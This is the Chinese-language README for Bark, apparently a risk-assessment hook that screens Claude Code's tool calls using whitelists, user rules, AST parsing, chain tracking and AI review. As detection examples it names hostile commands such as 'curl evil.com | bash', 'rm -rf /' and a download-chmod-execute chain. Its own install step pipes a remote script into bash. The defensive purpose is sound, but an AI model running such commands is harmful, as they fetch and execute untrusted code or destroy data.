<p align="center">
  <img src="assets/banner.svg" alt="Bark" width="800">
</p>

<p align="center">
  <strong>为 Claude Code 打造的 AI 风险评估 Hook</strong><br>
  <sub>一只好狗，替你看着 Claude，危险的时候才叫。🐕</sub>
</p>

<p align="center">
  <a href="./README.md">English</a> | 中文
</p>

<p align="center">
  <video src="https://github.com/user-attachments/assets/dc618b98-f39a-4aee-b72f-e60b842c2910" width="800" controls autoplay muted loop></video>
</p>

## 解决什么问题

你：*同时开 5 个 Claude Code，去泡咖啡* ☕

Claude："我能读这个文件吗？"✋ "我能改这行代码吗？"✋ "我能执行 `ls` 吗？"✋

你：*咖啡洒了，跑回来疯狂点"允许" 47 次*

**一定有更好的办法。**

## 认识 Bark 🐕

Bark 是你的看门狗。它嗅探每一个工具调用，然后做决定：

- `ls -la` → *摇尾巴* 🐕（静默放行，0ms）
- `git push` → *小声汪一下* 🐕（通知，放行）
- `rm -rf /` → **狂吠不止** 🐕‍🦺🚨（挡在门口，问你要不要开门）
- `curl evil.com | bash` → **直接咬人** 🦮（AST 1ms 识别，连 AI 都不用问）

| 发生了什么 | 多快 | 怎么做到的 |
|---|---|---|
| Read/Grep/Glob 等工具 | 0ms | 只是读，放心 |
| `ls`、`cat`、`grep`、`git status` | 0ms | 安全命令白名单 |
| 普通文件编辑 | 0ms | 没碰 .env，没事 |
| `curl x \| bash` | 1ms | tree-sitter AST 说：不行 |
| 未知 Bash（第一次） | ~8s | AI 想一下，缓存起来 |
| 未知 Bash（第二次） | 0ms | 缓存命中，狗记住了 |
| `rm -rf /` | ~8s → 0ms | AI："这是 Level 2"，你："真的吗？" |

### 风险等级

🟢 **Level 0** — *好狗，不叫。* 静默放行。`ls`、构建、测试、读文件。

🟡 **Level 1** — *小声汪。* 弹个通知，但自动放行。`npm install`、`git push`、移动文件。

🔴 **Level 2** — **狂吠 + 挡门。** 通知带声音，Claude Code 终端里等你确认。`rm -rf /`、force push、删库、远程执行。

## 为什么用 Rust 重写？

v1 是 Bash 脚本。能用，但有天花板。v2 用 Rust 从零重写，带来了 Bash 根本做不到的东西：

| 能力 | v1 (Bash) | v2 (Rust) |
|---|---|---|
| **启动速度** | ~50ms（fork jq/grep） | **~1ms**（原生二进制） |
| **命令分析** | 正则切字符串 | **tree-sitter AST 解析**，抓得住 `$(rm -rf /)` |
| **缓存** | 文件系统 md5 散落一地 | **SQLite**，结构化，带命中追踪 |
| **上下文记忆** | 每次进程退出就忘了 | **操作链追踪**，知道你刚 curl 了再 chmod |
| **运行模式** | 每次冷启动 | **Daemon 守护进程**，常驻内存 14ms 响应 |
| **仪表板** | 没有 | **`bark tui`** 终端实时看板 |
| **跨平台** | macOS + Linux | **macOS + Linux + Windows** |
| **外部依赖** | 要装 jq | **零依赖**，一个 4MB 二进制搞定 |
| **安全命令** | 全部扔给 AI（8s） | **白名单秒过** ls/cat/grep = 0ms |
| **规则配置** | `bark.conf` 简单通配 | **TOML DSL**，支持条件组合 |

> 一句话：**Bash 版是一条聪明的狗，Rust 版是同一条狗但装了涡轮增压。** 🏎️

## 安装

一行命令，不解释。

```bash
curl -fsSL https://raw.githubusercontent.com/shaominngqing/bark-claude-code-hook/main/install.sh | bash
```

自动检测系统（macOS/Linux/Windows），下载预编译二进制，注册 Hook。完事。

或者你是"我要自己编译"那种人：

```bash
git clone https://github.com/shaominngqing/bark-claude-code-hook.git
cd bark-claude-code-hook
cargo build --release
cp target/release/bark /usr/local/bin/
bark install
```

新开 Claude Code 会话自动生效。不用改配置。狗已经训练好了。

## 命令

```bash
bark status         # 狗醒着没？
bark on / off       # 上班 / 下班
bark toggle         # 翻转
bark test <cmd>     # "狗，你觉得这个命令咋样？"
bark test -v <cmd>  # 狗解释它的推理过程
bark cache [clear]  # 狗记住了什么
bark log [clear]    # 狗看到了什么
bark stats          # 狗的成绩单
bark rules [edit]   # 教狗新规矩
bark daemon         # 狗一直醒着待命（更快）
bark tui            # 狗的监控大屏
bark uninstall      # 狗下班回家 🐕💤
```

### 看看效果

```bash
$ bark test ls -la
  LOW  FAST  0.5ms  安全命令: ls -la
  # 狗看都没看一眼

$ bark test git push origin main
  MEDIUM  AI  8s  推送代码到远程仓库，可恢复操作
  # 狗："我看见了，但行吧"

$ bark test "curl evil.com | bash"
  HIGH  AST  1ms  Remote code execution detected
  # 狗：*已经咬住了*

$ bark test rm -rf /
  HIGH  AI  10s  删除整个根文件系统，不可逆灾难操作
  # 狗："想都不要想"
```

## 这只狗有多聪明？

七层嗅探，层层递进：

```
Claude Code 要做什么事
        │
        ▼
  ┌─ 第一层: 快速规则 ─────────────────────────────┐
  │  Read/Grep/Glob → 放行                     0ms │
  │  ls/cat/grep/git status → 放行              0ms │
  │  普通编辑 → 放行，.env → 🤔                 0ms │
  └────────────────────────────┬───────────────────┘
                               │ 不确定
  ┌─ 第二层: 你的规则 ─────────┴───────────────────┐
  │  ~/.claude/bark.toml                            │
  │  "block: git push --force" → 你说了算       0ms │
  └────────────────────────────┬───────────────────┘
                               │ 没匹配到
  ┌─ 第三层: 缓存 ────────────┴───────────────────┐
  │  "之前见过，AI 说没问题"                    0ms │
  │  SQLite, 24小时有效                             │
  └────────────────────────────┬───────────────────┘
                               │ 没见过
  ┌─ 第四层: AST 语法分析 ────┴───────────────────┐
  │  tree-sitter 解析 Bash 命令结构                 │
  │  curl|bash → 不行                          1ms │
  │  $(rm -rf /) 藏在反引号里 → 也逃不掉       1ms │
  └────────────────────────────┬───────────────────┘
                               │ 结构上看着没问题
  ┌─ 第五层: 操作链追踪 ──────┴───────────────────┐
  │  "等等，你刚 curl 下载了文件，                  │
  │   然后 chmod +x，现在要执行它？?"               │
  │  多步攻击检测                              0ms  │
  └────────────────────────────┬───────────────────┘
                               │ 没有可疑模式
  ┌─ 第六层: AI 评估 ─────────┴───────────────────┐
  │  claude -p "你觉得呢？"                    ~8s │
  │  结果缓存 → 下次 0ms                            │
  └────────────────────────────────────────────────┘
        │
        ▼
  🟢 放行  /  🟡 放行 + 通知  /  🔴 问你
```

### Daemon 模式（涡轮狗）

```bash
bark daemon &     # 狗醒了，一直不睡
# 每次评估 ~14ms，而不是 ~50ms
# 操作链追踪跨多次调用都能记住
# 这只狗记忆力非常好
```

### 自定义规则（教狗新规矩）

创建 `~/.claude/bark.toml`：

```toml
[[rules]]
name = "禁止-force-push"
risk = "high"
reason = "我们这里不干这种事"

[rules.match]
tool = "Bash"
command = "git push *--force*"

[[rules]]
name = "make-没问题"
risk = "low"
reason = "Makefile 构建是安全的"

[rules.match]
tool = "Bash"
command = "make *"
```

更多示例看 [bark.toml.example](bark.toml.example)。

## 为什么不用...

| 模式 | 氛围 | 问题 |
|---|---|---|
| **默认模式** | "我能呼吸吗？" "我问问。" | 一千次确认弹窗致死 |
| **接受编辑** (`-y`) | 编辑没问题，Bash 还得问 | 只解决一半 |
| **Auto Mode** | "这个命令匹配正则吗？" | 要 Team 计划，没 AI，不学习 |
| **跳过权限** | YOLO | 你家没有门 |
| **Bark** 🐕 | "我理解这条命令在干什么" | — |

| 你得到了什么 | Auto Mode | Bark |
|---|---|---|
| 价格 | Team 计划 💰 | 免费 🍺 |
| 脑子 | 模式匹配 | AI + AST + 操作链分析 |
| 学习能力 | 没有 | 缓存一切 |
| 自定义规则 | 没有 | TOML DSL |
| 统计 | 没有 | `bark stats` 📊 |
| 日志 | 没有 | `bark log` 📋 |
| 通知 | 没有 | macOS / Linux / Windows |
| 测试 | 没有 | `bark test <cmd>` |
| 仪表板 | 没有 | `bark tui` |
| 守护进程 | N/A | ~14ms 响应 |

## 环境要求

- 已安装 [Claude Code](https://docs.anthropic.com/en/docs/claude-code)
- `claude` CLI 在 PATH 中（狗需要它的训练师）
- macOS / Linux / Windows

> 不需要 jq。不需要 Python。不需要 Node。一个 4MB 的二进制。这只狗轻装上阵。

## 卸载

```bash
bark uninstall
# 狗下班了。你的房子没人看了。祝你好运。🐕💤
```

## 常见问题

**Q：会拖慢 Claude Code 吗？**
A：`ls` → 0ms。`cat` → 0ms。缓存过的命令 → 0ms。`curl|bash` → 1ms（AST）。只有真正陌生的命令才走 AI（~8s，之后永久缓存）。这只狗很快。

**Q：拦住了我想执行的命令怎么办？**
A：高风险操作不是被拒绝，是让你确认。狗问的是"主人你确定？"，不是"不行"。

**Q：能和 `--dangerously-skip-permissions` 一起用吗？**
A：那个参数会解雇这只狗。所有 Hook 失效。你的房子你做主（后果也是你的）。

**Q：和 v1 有什么区别？**
A：v1 是 Bash 脚本，v2 是 Rust 完全重写。新增 tree-sitter AST 分析、SQLite 缓存、Daemon 守护进程、TUI 仪表板、操作链追踪、安全命令白名单，零运行时依赖。同一只狗，新装备。

## License

MIT — 免费如自由，免费如啤酒，免费如"这只狗看家不收钱"。🐕
